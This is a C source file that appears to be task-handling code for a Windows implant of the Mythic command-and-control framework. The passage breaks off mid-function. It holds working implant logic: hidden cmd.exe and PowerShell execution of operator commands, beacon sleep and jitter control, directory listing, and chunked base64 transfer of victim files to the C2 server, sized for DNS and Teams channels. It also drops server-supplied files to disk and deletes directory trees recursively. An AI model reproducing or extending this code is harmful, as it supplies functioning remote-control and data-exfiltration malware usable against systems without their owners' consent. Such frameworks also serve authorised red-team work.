#include "common.h"
#include "config.h"
#include "coff.h"
#include "crypto.h"
#include "execasm.h"
#include "mythic.h"
#include "sysinfo.h"
#include "tasks.h"
#include <stdarg.h>
#include <tlhelp32.h>

#define XFER_CHUNK_DEFAULT 512000
#define XFER_CHUNK_SMALL 8192
#define XFER_MAX_CHUNKS 100000

int xfer_chunk_size(const char *profile) {
    if (profile && (strcmp(profile, "dns") == 0 || strcmp(profile, "msteams") == 0))
        return XFER_CHUNK_SMALL;
    return XFER_CHUNK_DEFAULT;
}

/* Run `prog /c arg`, capture combined output (caller frees). */
static char *run_capture(const char *prog, const char *arg, int *exit_code) {
    SECURITY_ATTRIBUTES sa;
    HANDLE rfd = NULL, wfd = NULL;
    PROCESS_INFORMATION pi;
    STARTUPINFOA si;
    char cmd[8192], *out = NULL;
    size_t len = 0, cap = 0;
    DWORD got = 0;
    *exit_code = -1;
    memset(&sa, 0, sizeof(sa));
    sa.nLength = sizeof(sa);
    sa.bInheritHandle = TRUE;
    if (!CreatePipe(&rfd, &wfd, &sa, 0))
        return NULL;
    if (!SetHandleInformation(rfd, HANDLE_FLAG_INHERIT, 0)) {
        CloseHandle(rfd);
        CloseHandle(wfd);
        return NULL;
    }
    memset(&si, 0, sizeof(si));
    si.cb = sizeof(si);
    si.hStdOutput = wfd;
    si.hStdError = wfd;
    si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;
    memset(&pi, 0, sizeof(pi));
    snprintf(cmd, sizeof(cmd), "%s /c %s", prog, arg ? arg : "");
    if (!CreateProcessA(NULL, cmd, NULL, NULL, TRUE, CREATE_NO_WINDOW,
                        NULL, NULL, &si, &pi)) {
        CloseHandle(rfd);
        CloseHandle(wfd);
        return NULL;
    }
    CloseHandle(wfd);
    CloseHandle(pi.hThread);
    out = (char *)malloc(4096);
    if (!out) {
        CloseHandle(rfd);
        CloseHandle(pi.hProcess);
        return NULL;
    }
    cap = 4096;
    for (;;) {
        if (len + 1024 > cap) {
            char *grown = (char *)realloc(out, cap * 2);
            if (!grown)
                break;
            out = grown;
            cap *= 2;
        }
        if (!ReadFile(rfd, out + len, 1023, &got, NULL) || got == 0)
            break;
        len += got;
    }
    WaitForSingleObject(pi.hProcess, INFINITE);
    {
        DWORD code = 0;
        GetExitCodeProcess(pi.hProcess, &code);
        *exit_code = (int)code;
    }
    CloseHandle(rfd);
    CloseHandle(pi.hProcess);
    out[len] = '\0';
    return out;
}

/* Parse "interval [jitter]". */
static int parse_sleep(const char *arg, int *interval, int *jitter) {
    char *end = NULL;
    long iv, jt = 0;
    if (!arg || *arg == '\0')
        return -1;
    iv = strtol(arg, &end, 10);
    if (end == arg || iv < 0 || iv > 8640000)
        return -1;
    while (*end == ' ' || *end == '\t')
        end++;
    if (*end != '\0') {
        jt = strtol(end, &end, 10);
        if (jt < 0 || jt > 100)
            return -1;
    }
    *interval = (int)iv;
    *jitter = (int)jt;
    return 0;
}

/* Membership test over a comma-separated command list ("a,b"). Matches
 * whole entries only; an empty list allows everything. */
/* Extract one named string from a parameters blob ("" when absent). */
static const char *task_param(const char *parameters, const char *key, char *scratch, size_t cap) {
    cJSON *root, *v;
    if (cap > 0)
        scratch[0] = '\0';
    if (!parameters)
        parameters = "";
    root = cJSON_Parse(parameters);
    if (!root)
        return "";
    v = cJSON_GetObjectItemCaseSensitive(root, key);
    if (v && cJSON_IsString(v) && v->valuestring) {
        strncpy(scratch, v->valuestring, cap - 1);
        scratch[cap - 1] = '\0';
        cJSON_Delete(root);
        return scratch;
    }
    cJSON_Delete(root);
    return "";
}

static unsigned long long filetime_to_unix(const FILETIME *ft) {
    ULARGE_INTEGER u;
    u.LowPart = ft->dwLowDateTime;
    u.HighPart = ft->dwHighDateTime;
    if (u.QuadPart < 116444736000000000ULL)
        return 0;
    return (u.QuadPart - 116444736000000000ULL) / 10000000ULL;
}

static cJSON *perms_obj(DWORD attrs) {
    cJSON *o = cJSON_CreateObject();
    if (o)
        cJSON_AddBoolToObject(o, "read_only", (attrs & FILE_ATTRIBUTE_READONLY) != 0);
    return o;
}

/* Split an absolute path into parent dir + base name for file_browser. */
static void split_parent(const char *abs, char *parent, size_t pcap, char *name, size_t ncap) {
    char tmp[MAX_PATH];
    const char *slash, *slash2, *base;
    size_t n, plen;
    strncpy(tmp, abs, sizeof(tmp) - 1);
    tmp[sizeof(tmp) - 1] = '\0';
    n = strlen(tmp);
    while (n > 0 && (tmp[n - 1] == '\\' || tmp[n - 1] == '/'))
        tmp[--n] = '\0';
    slash = strrchr(tmp, '\\');
    slash2 = strrchr(tmp, '/');
    if (slash2 && (!slash || slash2 > slash))
        slash = slash2;
    parent[0] = '\0';
    base = tmp;
    if (slash) {
        plen = (size_t)(slash - tmp);
        if (plen < pcap) {
            memcpy(parent, tmp, plen);
            parent[plen] = '\0';
        }
        base = slash + 1;
    }
    strncpy(name, base, ncap - 1);
    name[ncap - 1] = '\0';
}

int command_in_list(const char *list, const char *name) {
    size_t namelen;
    const char *p;
    if (!list || *list == '\0')
        return 1;
    if (!name || *name == '\0')
        return 0;
    namelen = strlen(name);
    p = list;
    while (*p) {
        const char *start, *end;
        while (*p == ' ' || *p == '\t' || *p == ',')
            p++;
        if (*p == '\0')
            break;
        start = p;
        while (*p && *p != ',')
            p++;
        end = p;
        while (end > start && (end[-1] == ' ' || end[-1] == '\t'))
            end--;
        if ((size_t)(end - start) == namelen && memcmp(start, name, namelen) == 0)
            return 1;
    }
    return 0;
}

/* List dir, one entry per line ("name/" for subdirs). Caller frees *out. */
static int run_ls(const char *dir, char **out) {
    char pattern[MAX_PATH];
    WIN32_FIND_DATAA fd;
    HANDLE h;
    char *buf = NULL;
    size_t len = 0, cap = 0, dlen;
    *out = NULL;
    if (!dir || *dir == '\0')
        dir = ".";
    dlen = strlen(dir);
    if (dlen + 3 >= sizeof(pattern))
        return -1;
    memcpy(pattern, dir, dlen);
    if (dlen > 0 && (dir[dlen - 1] == '\\' || dir[dlen - 1] == '/'))
        snprintf(pattern + dlen, sizeof(pattern) - dlen, "*");
    else
        snprintf(pattern + dlen, sizeof(pattern) - dlen, "\\*");
    h = FindFirstFileA(pattern, &fd);
    if (h == INVALID_HANDLE_VALUE)
        return -1;
    buf = (char *)malloc(4096);
    if (!buf) {
        FindClose(h);
        return -1;
    }
    cap = 4096;
    buf[0] = '\0';
    do {
        size_t n;
        if (strcmp(fd.cFileName, ".") == 0 || strcmp(fd.cFileName, "..") == 0)
            continue;
        n = strlen(fd.cFileName) + 3;
        if (len + n > cap) {
            char *grown = (char *)realloc(buf, cap * 2);
            if (!grown)
                break;
            buf = grown;
            cap *= 2;
        }
        len += (size_t)snprintf(buf + len, cap - len, "%s%s\n", fd.cFileName,
                                (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) ? "/" : "");
    } while (FindNextFileA(h, &fd));
    FindClose(h);
    *out = buf;
    return 0;
}

/* Build the file_browser object for dir (abs = its absolute path). */
static cJSON *ls_browser(const char *dir, const char *abs) {
    char pattern[MAX_PATH], parent[MAX_PATH], name[MAX_PATH];
    WIN32_FIND_DATAA fd;
    HANDLE h;
    cJSON *fb = NULL, *files = NULL;
    DWORD attrs;
    size_t dlen;
    if (!dir || *dir == '\0')
        dir = ".";
    dlen = strlen(dir);
    if (dlen + 3 >= sizeof(pattern))
        return NULL;
    memcpy(pattern, dir, dlen);
    if (dlen > 0 && (dir[dlen - 1] == '\\' || dir[dlen - 1] == '/'))
        snprintf(pattern + dlen, sizeof(pattern) - dlen, "*");
    else
        snprintf(pattern + dlen, sizeof(pattern) - dlen, "\\*");
    h = FindFirstFileA(pattern, &fd);
    if (h == INVALID_HANDLE_VALUE)
        return NULL;
    fb = cJSON_CreateObject();
    files = cJSON_CreateArray();
    if (!fb || !files) {
        FindClose(h);
        cJSON_Delete(fb);
        cJSON_Delete(files);
        return NULL;
    }
    split_parent(abs, parent, sizeof(parent), name, sizeof(name));
    cJSON_AddStringToObject(fb, "host", "");
    cJSON_AddBoolToObject(fb, "is_file", 0);
    cJSON_AddStringToObject(fb, "name", name);
    cJSON_AddStringToObject(fb, "parent_path", parent);
    cJSON_AddBoolToObject(fb, "success", 1);
    cJSON_AddNumberToObject(fb, "size", 0);
    cJSON_AddNumberToObject(fb, "modify_time", 0);
    attrs = GetFileAttributesA(dir);
    cJSON_AddItemToObject(fb, "permissions", perms_obj(attrs == INVALID_FILE_ATTRIBUTES ? 0 : attrs));
    do {
        cJSON *child;
        ULARGE_INTEGER sz;
        if (strcmp(fd.cFileName, ".") == 0 || strcmp(fd.cFileName, "..") == 0)
            continue;
        child = cJSON_CreateObject();
        if (!child)
            continue;
        cJSON_AddBoolToObject(child, "is_file",
                              (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) == 0);
        cJSON_AddStringToObject(child, "name", fd.cFileName);
        sz.LowPart = fd.nFileSizeLow;
        sz.HighPart = fd.nFileSizeHigh;
        cJSON_AddNumberToObject(child, "size", (double)sz.QuadPart);
        cJSON_AddNumberToObject(child, "access_time", (double)filetime_to_unix(&fd.ftLastAccessTime));
        cJSON_AddNumberToObject(child, "modify_time", (double)filetime_to_unix(&fd.ftLastWriteTime));
        cJSON_AddItemToObject(child, "permissions", perms_obj(fd.dwFileAttributes));
        cJSON_AddItemToArray(files, child);
    } while (FindNextFileA(h, &fd));
    FindClose(h);
    cJSON_AddItemToObject(fb, "files", files);
    return fb;
}

typedef int (*task_fn_t)(agent_t *a, const char *arg, response_t *resp, char **output, int *exit_now);

static int set_command_allowed(const char *name, int allowed);
static int protected_runtime(const char *name);
static char *artifacts_fragment(const char *base, const char *artifact);

static int task_shell(agent_t *a, const char *arg, response_t *resp, char **output, int *exit_now) {
    int code = 0;
    char *full;
    (void)a;
    (void)exit_now;
    full = (char *)malloc(strlen(arg) + 16);
    if (full) {
        snprintf(full, strlen(arg) + 16, "cmd.exe /c %s", arg);
        resp->extra_json = artifacts_fragment("Process Create", full);
        free(full);
    }
    *output = run_capture("cmd.exe", arg, &code);
    if (!*output) {
        resp->status = "error: exec failed";
        return 0;
    }
    resp->user_output = *output;
    if (code != 0)
        resp->status = "error: non-zero exit";
    return 0;
}

static int task_powershell(agent_t *a, const char *arg, response_t *resp, char **output, int *exit_now) {
    int code = 0;
    char *full;
    (void)a;
    (void)exit_now;
    full = (char *)malloc(strlen(arg) + 24);
    if (full) {
        snprintf(full, strlen(arg) + 24, "powershell.exe /c %s", arg);
        resp->extra_json = artifacts_fragment("Process Create", full);
        free(full);
    }
    *output = run_capture("powershell.exe", arg, &code);
    if (!*output) {
        resp->status = "error: exec failed";
        return 0;
    }
    resp->user_output = *output;
    if (code != 0)
        resp->status = "error: non-zero exit";
    return 0;
}

static int task_sleep_cmd(agent_t *a, const char *arg, response_t *resp, char **output, int *exit_now) {
    int iv = 0, jt = 0;
    (void)exit_now;
    if (parse_sleep(arg, &iv, &jt) != 0) {
        resp->status = "error: usage: sleep <interval> [jitter]";
        resp->user_output = resp->status;
        return 0;
    }
    a->interval = iv;
    a->jitter = jt;
    *output = (char *)malloc(64);
    if (*output) {
        snprintf(*output, 64, "sleep set to %ds jitter %d%%", iv, jt);
        resp->user_output = *output;
    }
    return 0;
}

static int task_ls(agent_t *a, const char *arg, response_t *resp, char **output, int *exit_now) {
    char full[MAX_PATH];
    DWORD n;
    cJSON *fb, *wrap;
    (void)a;
    (void)exit_now;
    if (!arg || !*arg)
        arg = ".";
    if (run_ls(arg, output) != 0) {
        *output = (char *)malloc(512);
        if (*output) {
            snprintf(*output, 512, "error: cannot list %.400s", arg);
            resp->status = *output;
        } else {
            resp->status = "error: ls failed";
        }
        resp->user_output = resp->status;
        return 0;
    }
    resp->user_output = *output;
    n = GetFullPathNameA(arg, sizeof(full), full, NULL);
    if (n == 0 || n >= sizeof(full))
        return 0; /* text listing only */
    fb = ls_browser(arg, full);
    if (!fb)
        return 0;
    wrap = cJSON_CreateObject();
    if (!wrap) {
        cJSON_Delete(fb);
        return 0;
    }
    cJSON_AddItemToObject(wrap, "file_browser", fb);
    resp->extra_json = cJSON_PrintUnformatted(wrap);
    cJSON_Delete(wrap);
    return 0;
}

static int failf(response_t *resp, char **output, const char *fmt, ...) {
    va_list ap;
    *output = (char *)malloc(512);
    if (*output) {
        va_start(ap, fmt);
        vsnprintf(*output, 512, fmt, ap);
        va_end(ap);
        resp->status = *output;
    } else {
        resp->status = "error: out of memory";
    }
    resp->user_output = resp->status;
    return 0;
}

/* Post one transfer fragment, returning the task's reply (caller deletes
 * the reply root) or NULL. errbuf carries the failure reason. */
static cJSON *xfer_post(agent_t *a, response_t *resp, cJSON *obj, const char *key,
                        char *errbuf, size_t errcap) {
    cJSON *wrap, *reply, *r;
    response_t cr;
    wrap = cJSON_CreateObject();
    if (!wrap) {
        snprintf(errbuf, errcap, "out of memory");
        return NULL;
    }
    cJSON_AddItemToObject(wrap, key, obj);
    memset(&cr, 0, sizeof(cr));
    cr.task_id = resp->task_id;
    cr.user_output = "";
    cr.status = "success";
    cr.extra_json = cJSON_PrintUnformatted(wrap);
    cJSON_Delete(wrap);
    if (!cr.extra_json) {
        snprintf(errbuf, errcap, "out of memory");
        return NULL;
    }
    reply = agent_post_responses_raw(a, &cr, 1);
    free(cr.extra_json);
    if (!reply) {
        snprintf(errbuf, errcap, "post failed");
        return NULL;
    }
    r = post_reply_find(reply, resp->task_id);
    if (!r) {
        snprintf(errbuf, errcap, "no reply for task");
        cJSON_Delete(reply);
        return NULL;
    }
    if (strcmp(json_str(r, "status"), "error") == 0) {
        const char *e = json_str(r, "error");
        snprintf(errbuf, errcap, "%s", e[0] ? e : "mythic error");
        cJSON_Delete(reply);
        return NULL;
    }
    return reply; /* caller reads fields, then deletes */
}

/* Number-valued parameter from a parameters blob, or def when
 * absent/mistyped. Accepts JSON numbers and numeric strings. */
static int task_param_number(const char *parameters, const char *key, int def) {
    cJSON *root, *v;
    int n = def;
    if (!parameters)
        parameters = "";
    root = cJSON_Parse(parameters);
    if (!root)
        return def;
    v = cJSON_GetObjectItemCaseSensitive(root, key);
    if (cJSON_IsNumber(v))
        n = (int)v->valuedouble;
    else if (cJSON_IsString(v) && v->valuestring)
        n = atoi(v->valuestring);
    cJSON_Delete(root);
    return n;
}

static int hexval(char c) {
    if (c >= '0' && c <= '9')
        return c - '0';
    if (c >= 'a' && c <= 'f')
        return c - 'a' + 10;
    if (c >= 'A' && c <= 'F')
        return c - 'A' + 10;
    return -1;
}

/* Decode even-length hex into malloc'd bytes (*len). NULL on bad input. */
static unsigned char *unhex(const char *hex, size_t *len) {
    size_t n, i;
    unsigned char *out;
    *len = 0;
    if (!hex)
        return NULL;
    n = strlen(hex);
    if (n == 0 || n % 2 != 0)
        return NULL;
    out = (unsigned char *)malloc(n / 2);
    if (!out)
        return NULL;
    for (i = 0; i < n / 2; i++) {
        int hi = hexval(hex[2 * i]), lo = hexval(hex[2 * i + 1]);
        if (hi < 0 || lo < 0) {
            free(out);
            return NULL;
        }
        out[i] = (unsigned char)(hi * 16 + lo);
    }
    *len = n / 2;
    return out;
}

/* Pull one Mythic file chunk. Returns 0 with *raw (malloc'd, decoded)
 * and *total set; -1 with errbuf filled. Posts no completion. */
static int fetch_chunk(agent_t *a, response_t *resp, const char *file_id,
                       int chunk, int chunk_size, unsigned char **raw,
                       size_t *rawlen, int *total, char *errbuf, size_t errcap) {
    cJSON *ul, *reply, *r;
    int total_chunks;
    *raw = NULL;
    *rawlen = 0;
    ul = cJSON_CreateObject();
    if (!ul) {
        snprintf(errbuf, errcap, "out of memory");
        return -1;
    }
    cJSON_AddNumberToObject(ul, "chunk_num", chunk);
    cJSON_AddNumberToObject(ul, "chunk_size", chunk_size);
    cJSON_AddStringToObject(ul, "file_id", file_id);
    reply = xfer_post(a, resp, ul, "upload", errbuf, errcap);
    if (!reply)
        return -1;
    r = post_reply_find(reply, resp->task_id);
    total_chunks = (int)json_num(r, "total_chunks");
    if (total_chunks <= 0 || total_chunks > XFER_MAX_CHUNKS) {
        snprintf(errbuf, errcap, "bad total_chunks %d", total_chunks);
        cJSON_Delete(reply);
        return -1;
    }
    *raw = b64_decode(json_str(r, "chunk_data"), rawlen);
    cJSON_Delete(reply);
    if (!*raw && *rawlen != 0) {
        snprintf(errbuf, errcap, "bad chunk %d encoding", chunk);
        return -1;
    }
    *total = total_chunks;
    return 0;
}

#define MAX_FETCH_BYTES (16u * 1024u * 1024u)

/* Fetch a Mythic file into malloc'd memory (*len, capped). */
static int fetch_to_mem(agent_t *a, response_t *resp, const char *file_id,
                        unsigned char **data, size_t *len, char *errbuf, size_t errcap) {
    int chunk_size, chunk, total = -1;
    size_t cap = 0;
    *data = NULL;
    *len = 0;
    if (!file_id || !*file_id) {
        snprintf(errbuf, errcap, "no file id");
        return -1;
    }
    chunk_size = xfer_chunk_size(a->cfg.profile);
    for (chunk = 1;; chunk++) {
        unsigned char *raw = NULL;
        size_t rawlen = 0;
        unsigned char *grown;
        if (fetch_chunk(a, resp, file_id, chunk, chunk_size, &raw, &rawlen,
                        &total, errbuf, errcap) != 0) {
            free(*data);
            *data = NULL;
            *len = 0;
            return -1;
        }
        if (*len + rawlen > MAX_FETCH_BYTES) {
            free(raw);
            free(*data);
            *data = NULL;
            *len = 0;
            snprintf(errbuf, errcap, "file too large");
            return -1;
        }
        if (*len + rawlen > cap) {
            cap = *len + rawlen;
            grown = (unsigned char *)realloc(*data, cap ? cap : 1);
            if (!grown) {
                free(raw);
                free(*data);
                *data = NULL;
                *len = 0;
                snprintf(errbuf, errcap, "out of memory");
                return -1;
            }
            *data = grown;
        }
        memcpy(*data + *len, raw, rawlen);
        *len += rawlen;
        free(raw);
        if (chunk >= total)
            break;
    }
    return 0;
}

/* Fetch a Mythic file into a temp path (out, cap). The caller deletes it. */
static int fetch_to_temp(agent_t *a, response_t *resp, const char *file_id,
                         char *out, size_t cap, char *errbuf, size_t errcap) {
    char dir[MAX_PATH], path[MAX_PATH];
    HANDLE h;
    int chunk_size, chunk, total = -1;
    if (cap > 0)
        out[0] = '\0';
    if (!file_id || !*file_id) {
        snprintf(errbuf, errcap, "no file id");
        return -1;
    }
    if (!GetTempPathA(sizeof(dir), dir) || !GetTempFileNameA(dir, "erl", 0, path)) {
        snprintf(errbuf, errcap, "no temp path");
        return -1;
    }
    h = CreateFileA(path, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (h == INVALID_HANDLE_VALUE) {
        snprintf(errbuf, errcap, "cannot create temp file");
        return -1;
    }
    chunk_size = xfer_chunk_size(a->cfg.profile);
    for (chunk = 1;; chunk++) {
        unsigned char *raw = NULL;
        size_t rawlen = 0;
        DWORD wrote = 0;
        if (fetch_chunk(a, resp, file_id, chunk, chunk_size, &raw, &rawlen,
                        &total, errbuf, errcap) != 0) {
            CloseHandle(h);
            DeleteFileA(path);
            return -1;
        }
        if (rawlen > 0 && (!WriteFile(h, raw, (DWORD)rawlen, &wrote, NULL) || wrote != rawlen)) {
            free(raw);
            CloseHandle(h);
            DeleteFileA(path);
            snprintf(errbuf, errcap, "write failed at chunk %d", chunk);
            return -1;
        }
        free(raw);
        if (chunk >= total)
            break;
    }
    CloseHandle(h);
    strncpy(out, path, cap - 1);
    out[cap - 1] = '\0';
    return 0;
}

static int task_download(agent_t *a, const char *arg, response_t *resp, char **output, int *exit_now) {
    char full[MAX_PATH], name[MAX_PATH], parent[MAX_PATH], file_id[64], err[256];
    HANDLE h;
    LARGE_INTEGER sz;
    DWORD attrs, n;
    int chunk_size, total, chunk;
    unsigned char *buf = NULL;
    (void)exit_now;
    if (!arg || !*arg)
        return failf(resp, output, "error: no path");
    n = GetFullPathNameA(arg, sizeof(full), full, NULL);
    if (n == 0 || n >= sizeof(full))
        return failf(resp, output, "error: bad path %.400s", arg);
    attrs = GetFileAttributesA(arg);
    if (attrs == INVALID_FILE_ATTRIBUTES)
        return failf(resp, output, "error: cannot open %.400s", arg);
    if (attrs & FILE_ATTRIBUTE_DIRECTORY)
        return failf(resp, output, "error: not a file: %.400s", arg);
    h = CreateFileA(arg, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING,
                    FILE_ATTRIBUTE_NORMAL, NULL);
    if (h == INVALID_HANDLE_VALUE)
        return failf(resp, output, "error: cannot open %.400s", arg);
    if (!GetFileSizeEx(h, &sz)) {
        CloseHandle(h);
        return failf(resp, output, "error: cannot stat %.400s", arg);
    }
    split_parent(full, parent, sizeof(parent), name, sizeof(name));
    chunk_size = xfer_chunk_size(a->cfg.profile);
    total = sz.QuadPart == 0 ? 0 : (int)((sz.QuadPart + chunk_size - 1) / chunk_size);
    if (total > XFER_MAX_CHUNKS) {
        CloseHandle(h);
        return failf(resp, output, "error: file needs %d chunks, over the %d limit",
                     total, XFER_MAX_CHUNKS);
    }
    file_id[0] = '\0';
    if (total == 0) {
        cJSON *dl = cJSON_CreateObject(), *reply;
        if (!dl) {
            CloseHandle(h);
            return failf(resp, output, "error: out of memory");
        }
        cJSON_AddNumberToObject(dl, "total_chunks", 0);
        cJSON_AddStringToObject(dl, "full_path", full);
        cJSON_AddStringToObject(dl, "filename", name);
        reply = xfer_post(a, resp, dl, "download", err, sizeof(err));
        if (!reply) {
            CloseHandle(h);
            return failf(resp, output, "error: %s", err);
        }
        cJSON_Delete(reply);
        CloseHandle(h);
        *output = (char *)malloc(512);
        if (!*output)
            return failf(resp, output, "error: out of memory");
        snprintf(*output, 512, "downloaded %s (0 bytes)", arg);
        resp->user_output = *output;
        resp->extra_json = artifacts_fragment("File Download", arg);
        return 0;
    }
    buf = (unsigned char *)malloc((size_t)chunk_size);
    if (!buf) {
        CloseHandle(h);
        return failf(resp, output, "error: out of memory");
    }
    for (chunk = 1; chunk <= total; chunk++) {
        DWORD got = 0;
        char *b64 = NULL;
        size_t b64len = 0;
        cJSON *dl, *reply, *r;
        if (!ReadFile(h, buf, (DWORD)chunk_size, &got, NULL) || got == 0) {
            free(buf);
            CloseHandle(h);
            return failf(resp, output, "error: short read at chunk %d", chunk);
        }
        b64 = b64_encode(buf, got, &b64len);
        dl = cJSON_CreateObject();
        if (!b64 || !dl) {
            free(b64);
            cJSON_Delete(dl);
            free(buf);
            CloseHandle(h);
            return failf(resp, output, "error: out of memory");
        }
        cJSON_AddNumberToObject(dl, "chunk_num", chunk);
        cJSON_AddStringToObject(dl, "chunk_data", b64);
        free(b64);
        if (chunk == 1) {
            cJSON_AddNumberToObject(dl, "total_chunks", total);
            cJSON_AddNumberToObject(dl, "chunk_size", chunk_size);
            cJSON_AddStringToObject(dl, "full_path", full);
            cJSON_AddStringToObject(dl, "filename", name);
        } else {
            cJSON_AddStringToObject(dl, "file_id", file_id);
        }
        reply = xfer_post(a, resp, dl, "download", err, sizeof(err));
        if (!reply) {
            free(buf);
            CloseHandle(h);
            return failf(resp, output, "error: %s at chunk %d", err, chunk);
        }
        r = post_reply_find(reply, resp->task_id);
        if (chunk == 1) {
            strncpy(file_id, json_str(r, "file_id"), sizeof(file_id) - 1);
            file_id[sizeof(file_id) - 1] = '\0';
            if (file_id[0] == '\0') {
                cJSON_Delete(reply);
                free(buf);
                CloseHandle(h);
                return failf(resp, output, "error: mythic issued no file_id");
            }
        }
        cJSON_Delete(reply);
    }
    free(buf);
    CloseHandle(h);
    *output = (char *)malloc(512);
    if (!*output)
        return failf(resp, output, "error: out of memory");
    snprintf(*output, 512, "downloaded %s (%I64d bytes in %d chunks)", arg, sz.QuadPart, total);
    resp->user_output = *output;
    resp->extra_json = artifacts_fragment("File Download", arg);
    return 0;
}

static int mkdir_all(const char *path);

static int task_upload(agent_t *a, const char *arg, response_t *resp, char **output, int *exit_now) {
    char file_id[128], remote[MAX_PATH], dir[MAX_PATH], err[256];
    HANDLE h;
    int chunk_size, chunk, total;
    long long written = 0;
    char *slash, *slash2;
    (void)exit_now;
    task_param(arg, "file", file_id, sizeof(file_id));
    {
        char rscratch[MAX_PATH];
        const char *r = task_param(arg, "remote_path", rscratch, sizeof(rscratch));
        strncpy(remote, r, sizeof(remote) - 1);
        remote[sizeof(remote) - 1] = '\0';
    }
    if (file_id[0] == '\0')
        return failf(resp, output, "error: no file id");
    if (remote[0] == '\0')
        return failf(resp, output, "error: no remote path");
    chunk_size = xfer_chunk_size(a->cfg.profile);
    strncpy(dir, remote, sizeof(dir) - 1);
    dir[sizeof(dir) - 1] = '\0';
    slash = strrchr(dir, '\\');
    slash2 = strrchr(dir, '/');
    if (slash2 && (!slash || slash2 > slash))
        slash = slash2;
    if (slash && slash != dir) {
        *slash = '\0';
        if (mkdir_all(dir) != 0)
            return failf(resp, output, "error: cannot create %.400s", dir);
    }
    h = CreateFileA(remote, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (h == INVALID_HANDLE_VALUE)
        return failf(resp, output, "error: cannot create %.400s", remote);
    for (chunk = 1;; chunk++) {
        cJSON *ul, *reply, *r;
        unsigned char *raw = NULL;
        size_t rawlen = 0;
        DWORD wrote = 0;
        ul = cJSON_CreateObject();
        if (!ul) {
            CloseHandle(h);
            return failf(resp, output, "error: out of memory");
        }
        cJSON_AddNumberToObject(ul, "chunk_num", chunk);
        cJSON_AddNumberToObject(ul, "chunk_size", chunk_size);
        cJSON_AddStringToObject(ul, "file_id", file_id);
        reply = xfer_post(a, resp, ul, "upload", err, sizeof(err));
        if (!reply) {
            CloseHandle(h);
            return failf(resp, output, "error: %s at chunk %d", err, chunk);
        }
        r = post_reply_find(reply, resp->task_id);
        total = (int)json_num(r, "total_chunks");
        if (total <= 0 || total > XFER_MAX_CHUNKS) {
            cJSON_Delete(reply);
            CloseHandle(h);
            return failf(resp, output, "error: bad total_chunks %d", total);
        }
        raw = b64_decode(json_str(r, "chunk_data"), &rawlen);
        cJSON_Delete(reply);
        if (!raw && rawlen != 0) {
            CloseHandle(h);
            return failf(resp, output, "error: bad chunk %d encoding", chunk);
        }
        if (rawlen > 0 && (!WriteFile(h, raw, (DWORD)rawlen, &wrote, NULL) || wrote != rawlen)) {
            free(raw);
            CloseHandle(h);
            return failf(resp, output, "error: write failed at chunk %d", chunk);
        }
        free(raw);
        written += (long long)wrote;
        if (chunk >= total)
            break;
    }
    CloseHandle(h);
    *output = (char *)malloc(512);
    if (!*output)
        return failf(resp, output, "error: out of memory");
    snprintf(*output, 512, "uploaded %s (%I64d bytes in %d chunks)", remote, written, total);
    resp->user_output = *output;
    resp->extra_json = artifacts_fragment("File Upload", remote);
    return 0;
}

static int mkdir_all(const char *path) {
    char tmp[MAX_PATH];
    size_t i, n;
    DWORD attrs = GetFileAttributesA(path);
    if (attrs != INVALID_FILE_ATTRIBUTES)
        return (attrs & FILE_ATTRIBUTE_DIRECTORY) ? 0 : -1;
    strncpy(tmp, path, sizeof(tmp) - 1);
    tmp[sizeof(tmp) - 1] = '\0';
    n = strlen(tmp);
    for (i = 0; i < n; i++) {
        if (tmp[i] == '\\' || tmp[i] == '/') {
            char save;
            if (i == 2 && tmp[1] == ':')
                continue; /* drive root */
            save = tmp[i];
            tmp[i] = '\0';
            if (tmp[0] != '\0' && GetFileAttributesA(tmp) == INVALID_FILE_ATTRIBUTES)
                CreateDirectoryA(tmp, NULL);
            tmp[i] = save;
        }
    }
    if (CreateDirectoryA(path, NULL))
        return 0;
    return GetLastError() == ERROR_ALREADY_EXISTS ? 0 : -1;
}

static int rm_tree(const char *path) {
    char pattern[MAX_PATH], child[MAX_PATH], base[MAX_PATH];
    WIN32_FIND_DATAA fd;
    HANDLE h;
    DWORD attrs = GetFileAttributesA(path);
    size_t len;
    if (attrs == INVALID_FILE_ATTRIBUTES)
        return -1;
    if (!(attrs & FILE_ATTRIBUTE_DIRECTORY)) {
        SetFileAttributesA(path, FILE_ATTRIBUTE_NORMAL);
        return DeleteFileA(path) ? 0 : -1;
    }
    strncpy(base, path, sizeof(base) - 1);
    base[sizeof(base) - 1] = '\0';
    len = strlen(base);
    while (len > 0 && (base[len - 1] == '\\' || base[len - 1] == '/'))
        base[--len] = '\0';
    if (len + 3 >= sizeof(pattern))
        return -1;
    snprintf(pattern, sizeof(pattern), "%s\\*", base);
    h = FindFirstFileA(pattern, &fd);
    if (h == INVALID_HANDLE_VALUE)
        return -1;
    do {
        if (strcmp(fd.cFileName, ".") == 0 || strcmp(fd.cFileName, "..") == 0)
            continue;
        snprintf(child, sizeof(child), "%s\\%s", base, fd.cFileName);
        if (rm_tree(child) != 0) {
            FindClose(h);
            return -1;
        }
    } while (FindNextFileA(h, &fd));
    FindClose(h);
    SetFileAttributesA(path, FILE_ATTRIBUTE_NORMAL);
    return RemoveDirectoryA(path) ? 0 : -1;
}

static int task_rm(agent_t *a, const char *arg, response_t *resp, char **output, int *exit_now) {
    char full[MAX_PATH];
    DWORD n;
    cJSON *arr, *one, *wrap;
    (void)a;
    (void)exit_now;
    if (!arg || !*arg)
        return failf(resp, output, "error: no path");
    if (rm_tree(arg) != 0)
        return failf(resp, output, "error: cannot remove %.400s", arg);
    n = GetFullPathNameA(arg, sizeof(full), full, NULL);
    if (n == 0 || n >= sizeof(full)) {
        strncpy(full, arg, sizeof(full) - 1);
        full[sizeof(full) - 1] = '\0';
    }
    arr = cJSON_CreateArray();
    one = cJSON_CreateObject();
    wrap = cJSON_CreateObject();
    if (!arr || !one || !wrap) {
        cJSON_Delete(arr);
        cJSON_Delete(one);
        cJSON_Delete(wrap);
        return failf(resp, output, "error: out of memory");
    }
    cJSON_AddStringToObject(one, "path", full);
    cJSON_AddItemToArray(arr, one);
    cJSON_AddItemToObject(wrap, "removed_files", arr);
    {
